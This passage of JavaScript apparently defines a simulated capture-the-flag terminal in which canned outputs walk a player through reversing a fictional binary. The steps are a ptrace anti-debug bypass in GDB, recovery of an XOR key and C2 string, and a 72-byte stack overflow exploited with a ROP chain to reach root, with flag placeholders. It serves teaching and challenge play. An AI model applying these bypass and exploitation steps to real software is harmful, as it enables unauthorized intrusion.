            C7Config._ropChainBuilt = true;
            return C7Config._binary.ropGadgets;
        },

        'ropgadget': function(args, term, engine) {
            // lowercase alias
            return C7Config.commands.ROPgadget(args, term, engine);
        },

        'python3': function(args, term, engine) {
            const script = args.find(a => a.endsWith('.py')) || '';

            // Running the exploit script
            if (script.includes('exploit') || script === 'exploit.py') {
                if (!C7Config._binaryAcquired) return 'python3: exploit.py: No such file or directory';
                if (!C7Config._ropChainBuilt && !C7Config._overflowDiscovered) {
                    return `[*] Sending payload to 10.13.37.1:1337...
[!] Connection established but no response — payload likely incorrect.
[!] Run ROPgadget --binary cipherspeak first to find gadget addresses.
[!] Verify the stack offset: python3 -c "from pwn import *; cyclic(200)" | nc 10.13.37.1 1337`;
                }
                C7Config._ropChainBuilt = true;
                if (engine) engine.advancePhase && engine.advancePhase('exploit');
                return `[*] Sending ROP chain to 10.13.37.1:1337...
[+] Connection established.
[+] Payload sent (${72 + 3 * 8} bytes: 72 padding + 3 gadgets).
[+] Received shell response...

uid=0(root) gid=0(root) groups=0(root)

shadow@SHADOW-SRV-01:/# cat /root/root.txt
{{FLAG:root}}

shadow@SHADOW-SRV-01:/# cat /home/shadow/shadow_covenant.txt
====== THE SHADOW COVENANT ======
Encoded under the Veiled Logic — now laid bare.

Article I:   The Veil is not a wall. It was never a wall.
Article II:  Any cipher built on secrecy of method alone is already broken.
Article III: The Covenant is compromised. The Encoders are dark.

Covenant Breach Confirmed — 2026-03-20 09:47:12 UTC
{{FLAG:root}}
================================

[+] Box complete. Shadow Covenant extracted.`;
            }

            // de-obfuscation helper script
            if (args.join(' ').includes('deobf') || args.join(' ').includes('patch')) {
                return `[*] Running de-obfuscation script...
[*] Tracing execution through dispatcher loop...
[*] Identified 9 unique states. Mapping real control flow...
[*] Patching binary: replacing dispatcher with direct jumps...
[+] De-obfuscated binary written to: cipherspeak_clean
[+] Load cipherspeak_clean in Ghidra for cleaner analysis.`;
            }

            // angr symbolic execution
            if (args.join(' ').includes('angr')) {
                return `[*] Running angr symbolic execution...
[*] Project loaded: cipherspeak (147456 bytes)
[*] Exploring from entry 0x401240...
[*] Found 9 paths through dispatcher.
[*] Concrete execution values at decrypt_string returns:
    0x4013f8: rax -> "shadow-c2.network"
    0x4013f8: rax -> "V31l3dL0g1c"
    0x4013f8: rax -> "[*] CipherSpeak v2.3.1"
[+] Symbolic execution revealed all decrypted string values.`;
            }

            // generic script
            return `python3: ${script || 'script'}: executed (no output)`;
        },

        'python': function(args, term, engine) {
            return C7Config.commands.python3(args, term, engine);
        },

        'nc': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-') && !a.match(/^\d{1,5}$/)) || '';
            const portArg = args.find(a => a.match(/^\d{4,5}$/)) || '';

            if ((target === '10.13.37.1' || target.includes('10.13.37.1')) && portArg === '1337') {
                return `[Connected to 10.13.37.1:1337]
[*] CipherSpeak v2.3.1 — Shadow Encoders Communication Utility
[*] Awaiting operator input...

> (type input and press Enter)
[!] Input exceeds internal buffer (overflow path — craft a proper exploit with pwntools)
[Connection closed by remote host]`;
            }

            if (!portArg) return 'Usage: nc [-options] hostname port';
            return `nc: connect to ${target} port ${portArg}: Connection refused`;
        },

        'netcat': function(args, term, engine) {
            return C7Config.commands.nc(args, term, engine);
        },

        'gdb': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!C7Config._binaryAcquired && target.includes('cipherspeak')) {
                return 'gdb: cipherspeak: No such file or directory';
            }

            C7Config._gdbActive = true;
            C7Config._switchContext('gdb', term);
            if (engine) engine.advancePhase && engine.advancePhase('dynamic');

            return `GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
This GDB was configured as "x86_64-linux-gnu".
Reading symbols from ${target || 'cipherspeak'}...
(No debugging symbols found in ${target || 'cipherspeak'})

(gdb)
[GDB SESSION ACTIVE — Use gdb commands or type 'gdb quit' to exit]
[Tip: set follow-fork-mode child | break | run | x/s $rax | info func]`;
        },

        'break': function(args, term, engine) {
            if (!C7Config._gdbActive) return 'break: command not found';
            const loc = args[0] || '';
            if (loc === '*0x4013f8' || loc === '*0x4013a0' || loc.includes('decrypt')) {
                C7Config._decryptBpSet = true;
                return `Breakpoint 1 at 0x4013f8
[+] Breakpoint set at decrypt_string return. Run the binary to hit it.`;
            }
            if (loc.includes('check_antidebug') || loc === '*0x401500') {
                return `Breakpoint 2 at 0x401500
[+] Breakpoint set at check_antidebug. Use: set $rax=0 after breaking here to bypass the ptrace check.`;
            }
            if (loc.includes('handle_input') || loc === '*0x4012a0') {
                C7Config._overflowDiscovered = true;
                return `Breakpoint 3 at 0x4012a0
[+] Breakpoint set at handle_input. Step through to observe the stack overflow.`;
            }
            return `Breakpoint at ${loc || 'unknown location'} — run the binary to activate.`;
        },

        'run': function(args, term, engine) {
            if (!C7Config._gdbActive) return 'run: command not found';
            if (!C7Config._decryptBpSet) {
                return `[Inferior 1 (process 2841) exited with code 01]

[ERR] Anti-debug check triggered. Terminating.
[!] The binary detected GDB via ptrace(PTRACE_TRACEME).
[!] Set a breakpoint at check_antidebug (0x401500) and patch the return value:
    break *0x401500
    run
    set $rax=0
    continue`;
            }
            C7Config._antiDebugBypassed = true;
            return `Starting program: /home/kali/cipherspeak
[Thread debugging using libthread_db enabled]

Breakpoint 2, 0x0000000000401500 in check_antidebug ()
(gdb) set $rax=0
(gdb) continue
Continuing.

Breakpoint 1, 0x00000000004013f8 in decrypt_string ()
(gdb) x/s $rax
0x404020: "[*] CipherSpeak v2.3.1 -- Shadow Encoders Communication Utility"

Continuing.
Breakpoint 1, 0x00000000004013f8 in decrypt_string ()
(gdb) x/s $rax
0x404060: "[*] Initializing secure channel..."

Continuing.
Breakpoint 1, 0x00000000004013f8 in decrypt_string ()
(gdb) x/s $rax
0x4040a0: "shadow-c2.network"

[+] C2 DOMAIN RECOVERED: shadow-c2.network
[+] This is the content of /home/shadow/user.txt — Flag 1.

Continuing.
Breakpoint 1, 0x00000000004013f8 in decrypt_string ()
(gdb) x/s $rax
0x4040c0: "V31l3dL0g1c"

[+] INTERNAL KEY RECOVERED: V31l3dL0g1c
[+] Used as part of the XOR key derivation in decrypt_string().

Continuing.
[Inferior 1 (process 2841) exited normally]
(gdb)`;
        },

        'continue': function(args, term, engine) {
            if (!C7Config._gdbActive) return 'continue: command not found';
            return `Continuing.

Breakpoint 1, 0x00000000004013f8 in decrypt_string ()
(gdb) x/s $rax
0x4040e0: "[*] Awaiting operator input on port 1337"

Continuing.
[Inferior 1 (process 2841) exited normally]
(gdb)`;
        },

        'set': function(args, term, engine) {
            if (!C7Config._gdbActive) return 'set: command not found';
            const full = args.join(' ');
            if (full.includes('$rax') && full.includes('0')) {
                C7Config._antiDebugBypassed = true;
                return `[+] $rax set to 0 — ptrace check will return 0 (no debugger detected).`;
            }
            return `set ${args.join(' ')}`;
        },

        'info': function(args, term, engine) {
            if (!C7Config._gdbActive) return 'info: command not found';
            const sub = args[0] || '';
            if (sub === 'func' || sub === 'functions') {
                return `All defined functions:
Non-debugging symbols:
0x0000000000401060  read@plt
0x0000000000401070  write@plt
0x0000000000401080  bind@plt
0x0000000000401090  ptrace@plt
0x00000000004010a0  exit@plt
0x00000000004010b0  system@plt
0x00000000004010c0  close@plt
0x0000000000401240  (main dispatcher — CFF)
0x0000000000401500  check_antidebug
0x00000000004013a0  decrypt_string
0x00000000004012a0  handle_input
0x0000000000401614  (ret gadget)
0x000000000040161f  (pop rdi ; ret gadget)`;
            }
            if (sub === 'registers' || sub === 'reg') {
                return `rax            0x4040a0            4210848
rbx            0x0                 0
rcx            0xd                 13
rdx            0xd                 13
rsi            0x4040a0            4210848
rdi            0x12                18
rsp            0x7fffffff9d30      0x7fffffff9d30
rbp            0x7fffffff9d40      0x7fffffff9d40
rip            0x4013f8            0x4013f8`;
            }
            return `info ${args.join(' ')}: use 'info func' or 'info registers'`;
        },

        'x': function(args, term, engine) {
            if (!C7Config._gdbActive) return 'x: command not found';
            const fmt = args[0] || '';
            if (fmt === '/s' && args[1]) {
                const addr = args[1];
                if (addr === '$rax' || addr === '0x4040a0') {
                    return `0x4040a0: "shadow-c2.network"`;
                }
                if (addr === '0x4040c0') return `0x4040c0: "V31l3dL0g1c"`;
                if (addr === '0x404020') return `0x404020: "[*] CipherSpeak v2.3.1 -- Shadow Encoders Communication Utility"`;
                return `${addr}: ""`;
            }
            if (fmt === '/20i' || fmt === '/i') {
                return `=> 0x4013f8:    mov    %rbp,%rsp
   0x4013fb:    pop    %rbp
   0x4013fc:    ret
   0x4013fd:    nop
   0x4013fe:    nop
   0x4013ff:    push   %rbp`;
            }
            return `${args.join(' ')} = 0x0`;
        },

        'disas': function(args, term, engine) {
            if (!C7Config._gdbActive) return 'disas: command not found';
            const fn = args[0] || '';
            if (fn.includes('handle_input') || fn === '0x4012a0') {
                C7Config._overflowDiscovered = true;
                return `Dump of assembler code for function handle_input:
   0x00000000004012a0 <+0>:  push   %rbp
   0x00000000004012a1 <+1>:  mov    %rsp,%rbp
   0x00000000004012a4 <+4>:  sub    $0x50,%rsp        ; allocate 80 bytes (buf[64] + locals)
   0x00000000004012a8 <+8>:  mov    %edi,-0x44(%rbp)   ; conn_fd
   0x00000000004012ab <+11>: lea    -0x40(%rbp),%rax   ; &buf[0]
   0x00000000004012af <+15>: mov    $0x200,%edx        ; size = 512 (OVERFLOW!)
   0x00000000004012b4 <+20>: mov    %rax,%rsi
   0x00000000004012b7 <+23>: mov    $0x0,%edi
   0x00000000004012bc <+28>: call   0x401060 <read@plt>
   0x00000000004012c1 <+33>: test   %rax,%rax
   0x00000000004012c4 <+36>: jle    0x4012e0
   0x00000000004012c6 <+38>: ...relay_message...
End of assembler dump.

[!] VULNERABILITY: buf is 64 bytes (0x40) but read() takes 512 (0x200)
[!] No stack canary (confirmed by checksec). NX enabled — need ROP chain.
[!] Offset to saved RIP: 72 bytes (64 buf + 8 saved rbp)`;
            }
            if (fn.includes('decrypt_string') || fn === '0x4013a0') {
                return `Dump of assembler code for function decrypt_string:
   0x00000000004013a0 <+0>:  push   %rbp
   0x00000000004013a1 <+1>:  mov    %rsp,%rbp
   0x00000000004013a4 <+4>:  sub    $0x20,%rsp
   0x00000000004013a8 <+8>:  mov    %rdi,-0x18(%rbp)   ; enc_buf
   0x00000000004013ac <+12>: mov    %esi,-0x1c(%rbp)   ; len
   0x00000000004013b0 <+16>: movb   $0x56,-0x10(%rbp)  ; key[0] = 'V' (0x56)
   0x00000000004013b5 <+21>: movb   $0x33,-0x0f(%rbp)  ; key[1] = '3' (0x33)
   0x00000000004013ba <+26>: movb   $0x69,-0x0e(%rbp)  ; key[2] = 'i' (0x69)
   0x00000000004013bf <+31>: movb   $0x6c,-0x0d(%rbp)  ; key[3] = 'l' (0x6c)
   0x00000000004013c4 <+36>: movl   $0x0,-0x4(%rbp)    ; i = 0
   ...XOR loop...
   0x00000000004013f4 <+84>: ret
End of assembler dump.

[+] XOR key identified: 0x56 0x33 0x69 0x6c = "V3il"
[+] Key hint: first 4 chars of "Veiled Logic"`;
            }
            return `No symbol "${fn}" in current context.`;
        },

        'quit': function(args, term, engine) {
            if (C7Config._context === 'gdb') {
                C7Config._gdbActive = false;
                C7Config._switchContext('attacker', term);
                return '[GDB session ended]\n[+] Returned to attacker shell.';
            }
            return 'logout';
        },

        'cat': function(args, term, engine) {
            // Intercept only when files in the current analysis scope are accessed
            const path = args[0] || '';

            if (path.includes('user.txt')) {
                if (!C7Config._antiDebugBypassed && !C7Config._decryptBpSet) {
                    return `cat: ${path}: No such file or directory\n[!] user.txt exists on the target server, not on your local machine.\n[!] Recover the C2 domain via GDB dynamic analysis to get Flag 1.`;
                }
                // user.txt is accessible after string decryption
                return `shadow-c2.network\n\n{{FLAG:user}}`;
            }

            if (path.includes('root.txt') || path.includes('shadow_covenant')) {
                if (!C7Config._ropChainBuilt) {
                    return `cat: ${path}: Permission denied\n[!] root.txt is only accessible after successful exploitation of the buffer overflow.`;
                }
                return `====== THE SHADOW COVENANT ======\nEncoded under the Veiled Logic — now laid bare.\n\nArticle I:   The Veil is not a wall. It was never a wall.\nArticle II:  Any cipher built on secrecy of method alone is already broken.\nArticle III: The Covenant is compromised. The Encoders are dark.\n\nCovenant Breach Confirmed — 2026-03-20 09:47:12 UTC\n\n{{FLAG:root}}`;
            }

            if (path.includes('notes.txt') || path === '/home/kali/notes.txt' || path === 'notes.txt') {
                return C7Config.filesystem['/'].children['home'].children['kali'].children['notes.txt'].content;
            }

            if (path.includes('exploit.py') || path === './exploit.py') {
                return C7Config.filesystem['/'].children['home'].children['kali'].children['exploit.py'].content;
            }

            if (path.includes('/etc/passwd')) {
                return 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash';
            }

            return null; // fall through to built-in
        },

        'ls': function(args, term, engine) {
            const path = (args.find(a => !a.startsWith('-')) || '.').replace(/\/$/, '');

            if (path === '.' || path === '/home/kali' || path === '~') {
                const files = ['.bash_history', 'exploit.py', 'notes.txt'];
                if (C7Config._binaryAcquired) files.push('cipherspeak');
                const hasA = args.includes('-a') || args.includes('-la') || args.includes('-al');
                const hasL = args.includes('-l') || args.includes('-la') || args.includes('-al');
                if (hasL) {
                    let out = 'total ' + (C7Config._binaryAcquired ? '196' : '52') + '\n';
                    if (hasA) {
                        out += 'drwxr-xr-x 2 kali kali   4096 Mar 20 09:14 .\n';
                        out += 'drwxr-xr-x 4 root root   4096 Jan  5 08:00 ..\n';
                        out += '-rw------- 1 kali kali    156 Mar 20 09:14 .bash_history\n';
                    }
                    out += '-rwxr-xr-x 1 kali kali   2048 Mar 20 08:30 exploit.py\n';
                    out += '-rw-r--r-- 1 kali kali    512 Mar 20 08:30 notes.txt\n';
                    if (C7Config._binaryAcquired) {
                        out += '-rwxr-xr-x 1 kali kali 147456 Mar 20 09:14 cipherspeak\n';
                    }
                    return out.trim();
                }
                return files.join('  ');
            }

            return null; // fall through to built-in
        },

        'whoami': function(args, term, engine) {
            if (C7Config._context === 'gdb') return '(gdb) — use quit to exit GDB';
            return null; // fall through to built-in
        },

        'id': function(args, term, engine) {
            if (C7Config._context === 'gdb') return '(gdb) — use quit to exit GDB';
            return null; // fall through to built-in
        },

        'hostname': function(args, term, engine) {
            return null; // fall through to built-in
        },

        'pwd': function(args, term, engine) {
            return null; // fall through to built-in
        },

        'cd': function(args, term, engine) {
            return null; // fall through to built-in
        },

        'exit': function(args, term, engine) {
            if (C7Config._context === 'gdb') {
                return C7Config.commands.quit(args, term, engine);
            }
            return 'logout';
        },

        'ping': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.13.37.1') {
                return `PING 10.13.37.1 (10.13.37.1) 56(84) bytes of data.
64 bytes from 10.13.37.1: icmp_seq=1 ttl=64 time=31.2 ms
64 bytes from 10.13.37.1: icmp_seq=2 ttl=64 time=30.8 ms
64 bytes from 10.13.37.1: icmp_seq=3 ttl=64 time=31.4 ms

--- 10.13.37.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 30.8/31.1/31.4/0.252 ms`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        'frida': function(args) {
            if (!C7Config._binaryAcquired) return 'frida: cipherspeak not found.';
            return `Frida 16.1.3 — Dynamic binary instrumentation
[*] Attaching to cipherspeak...
[*] Script loaded. Hooking decrypt_string @ 0x4013a0

[decrypt_string] return value: "[*] CipherSpeak v2.3.1 -- Shadow Encoders Communication Utility"
[decrypt_string] return value: "[*] Initializing secure channel..."
[decrypt_string] return value: "shadow-c2.network"
[decrypt_string] return value: "V31l3dL0g1c"
[decrypt_string] return value: "[ERR] Anti-debug check triggered. Terminating."
[decrypt_string] return value: "SHADOW_COVENANT_DECRYPT_KEY"
[decrypt_string] return value: "[*] Awaiting operator input on port 1337"

[+] All 7 decrypted strings captured.
[+] C2 domain: shadow-c2.network — this is Flag 1.`;
        },

        'angr': function(args, term, engine) {
            if (!C7Config._binaryAcquired) return 'angr: cipherspeak not found. Run: pip3 install angr first.';
            return C7Config.commands.python3(['angr_script.py'], term, engine);
        },

        'strace': function(args) {
            if (!C7Config._binaryAcquired) return 'strace: cipherspeak not found.';
            return `execve("./cipherspeak", ["./cipherspeak"], 0x7fff... /* 34 vars */) = 0
brk(NULL)                               = 0x55555575a000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f...
ptrace(PTRACE_TRACEME, 0, NULL, NULL)   = -1 EPERM (Operation not permitted)
write(2, "[ERR] Anti-debug check triggered", 34) = 34
exit_group(1)                           = ?

[strace itself IS a tracer — ptrace check fires immediately]
[TIP: Patch the ptrace() return in GDB instead of using strace]`;
        },

        'ltrace': function(args) {
            if (!C7Config._binaryAcquired) return 'ltrace: cipherspeak not found.';
            return `[ltrace attaches as a tracer — anti-debug will trigger immediately]
ptrace(PTRACE_TRACEME, 0, 0, 0) = -1
write(2, "[ERR] Anti-debug check triggered...", 35) = 35
exit(1) = <void>

[!] Use GDB with manual ptrace bypass: break *0x401500 then set $rax=0`;
        },

        'sha256sum': function(args) {
            const target = args[0] || '';
            if (!C7Config._binaryAcquired) return `sha256sum: ${target}: No such file or directory`;
            if (target.includes('cipherspeak')) {
                return `${C7Config._binary.sha256}  cipherspeak`;
            }
            return `sha256sum: ${target}: No such file or directory`;
        },

        'md5sum': function(args) {
            const target = args[0] || '';
            if (!C7Config._binaryAcquired) return `md5sum: ${target}: No such file or directory`;
            if (target.includes('cipherspeak')) {
                return `d41d8cd98f00b204e9800998ecf8427e  cipherspeak`;
            }
            return `md5sum: ${target}: No such file or directory`;
        },

        // IDA Pro simulation (alternative to Ghidra)
        'ida': function(args, term, engine) {
            if (!C7Config._binaryAcquired) return 'ida: cipherspeak not found.';
            C7Config._ghidraLoaded = true;
            if (engine) engine.advancePhase && engine.advancePhase('dynamic');
            return `IDA Pro 8.3 — Interactive Disassembler
[*] Loading cipherspeak...
[*] Auto-analysis complete (ELF64 x86).

SUMMARY:
[!] Control flow flattening: dispatcher @ 0x401240 — 9 states
[!] Junk code: NOPs and dead computations interspersed
[!] String encryption: decrypt_string @ 0x4013a0 (XOR, 4-byte key)
[!] Anti-debug: ptrace(PTRACE_TRACEME) @ 0x401500
[!] Overflow: handle_input @ 0x4012a0 — read(fd, buf64, 512)

[+] IDA Python script available to recover CFG automatically
[+] Tip: Attach debugger (GDB) and set breakpoint at 0x4013f8 to dump strings`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // GHIDRA SHOW HANDLER
    // Parses 'ghidra -show <function>' invocations from terminal
    // ═══════════════════════════════════════════════════════

    _handleGhidraShow(funcName) {
        if (!C7Config._ghidraLoaded) return 'ghidra: no project loaded. Run ghidra first.';
        switch (funcName) {
            case 'main_dispatcher':
            case 'dispatcher':
                return C7Config._binary.ghidra.mainDispatcher;
            case 'handle_input':
            case 'handleinput':
                C7Config._overflowDiscovered = true;
                return C7Config._binary.ghidra.handleInput;
            case 'decrypt_string':
            case 'decryptstring':
                return C7Config._binary.ghidra.decryptString;
            case 'check_antidebug':
            case 'antidebug':
                return C7Config._binary.ghidra.checkAntidebug;
            default:
                return `ghidra: function '${funcName}' not found in symbol table.\nAvailable: main_dispatcher, handle_input, decrypt_string, check_antidebug`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#8e44ad; border-bottom:2px solid #ddd; background:#f9f5fd;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #eee;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
